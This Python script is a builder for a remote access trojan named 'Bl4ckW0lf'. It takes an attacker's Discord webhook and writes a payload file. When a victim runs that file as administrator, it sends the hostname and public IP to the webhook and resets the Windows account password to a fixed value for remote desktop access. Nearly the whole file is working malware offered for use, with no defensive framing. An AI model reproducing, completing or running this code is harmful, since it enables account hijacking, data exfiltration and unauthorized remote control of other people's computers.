import os
import time

os.system("title Bl4ckW0lf - Advanced R.A.T Engine")

webhook = ""

print('''
                              __
                            .d$$b
                          .' TO$;\\
                         /  : TP._;
                        / _.;  :Tb|
                       /   /   ;j$j
                   _.-"       d$$$$
                 .' ..       d$$$$;
                /  /P'      d$$$$P. |\\
               /   "      .d$$$P' |\^"l
             .'           `T$P^"""""  :
         ._.'      _.'                ;
      `-.-".-'-' ._.       _.-"    .-"
    `.-" _____  ._              .-"
   -(.g$$$$$$$b.              .'
     ""^^T$$$P^)            .(:
       _/  -"  /.'         /:/;
    ._.'-'`-'  ")/         /;/;
 `-.-"..--""   " /         /  ;
.-" ..--""        -'          :
..--""--.-"         (\      .-(\\
  ..--""              `-\(\/;`
    _.                      :
                            ;`-
                           :\\
                           ;    Bl4ckW0lf - Advanced R.A.T Engine using RDP System
```````````````````````````````````````````````````````````````````````````````````
Open a distant acces on a target and get access to the target by a discord wb
''')

webhook = input("[+] Webhook: ")

rest = """- Username : {hostname}- IP Address : {ip} - Password : {passw} - Acces was successfully openned!```')"""

contentr = f"""(f'```Bl4ckW0lf - discord.gg/illegality """ + rest

os.system("pip install dhooks")
file1 = open("buildt.py", "w")
file1.write("import os, socket, requests")
file1.write("")
file1.write("\nfrom dhooks import Webhook")
file1.write("")
file1.write(f"\n\nhook = Webhook('{webhook}')")
file1.write("")
file1.write("\n\nhostname = socket.gethostname()")
file1.write("")
file1.write("\n\nip = requests.get('https://api.ipify.org').text")
file1.write("")
file1.write("\n\npassw = 'Bl4ckW0lf2023'")
file1.write("")
file1.write(f"\n\nhook.send{contentr}")
file1.write("")
file1.write("\nos.system(f'net user %username% {passw}')")
file1.close()

print()
print("[+] Build as buildt.py")
print("[+] Target need to execute it in admin mode")
print()